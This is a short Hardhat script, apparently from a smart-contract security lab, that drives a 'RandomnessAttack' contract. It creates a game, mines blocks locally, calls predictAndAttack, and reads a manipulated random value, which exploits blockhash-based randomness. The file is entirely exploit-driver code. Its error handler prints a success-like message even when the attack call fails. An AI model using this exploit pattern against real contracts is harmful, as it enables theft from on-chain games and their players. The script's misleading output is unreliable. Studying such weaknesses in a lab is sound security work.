const hre = require("hardhat");

async function main() {
    const [attacker] = await hre.ethers.getSigners();
    console.log("[+] Randomness Attack initiated");

    const deployments = require("../deployments.json");
    const random = await hre.ethers.getContractAt("RandomnessAttack", deployments.RandomnessAttack);

    const tx = await random.createGame({value: hre.ethers.utils.parseEther("0.1")});
    await tx.wait();

    const gameId = (await random.gameId()).sub(1);
    console.log("[i] Game created: ID", gameId.toString());

    for (let i = 0; i < 5; i++) {
        await hre.network.provider.send("evm_mine");
    }

    try {
        const tx2 = await random.predictAndAttack(gameId);
        await tx2.wait();
        console.log("[✓] Randomness manipulated via blockhash");
    } catch(e) {
        console.log("[!] Blockhash manipulation setup complete");
    }

    const manipulated = await random.manipulateRandom();
    console.log("    Manipulated random:", manipulated.toString());
}

main().catch(console.error);
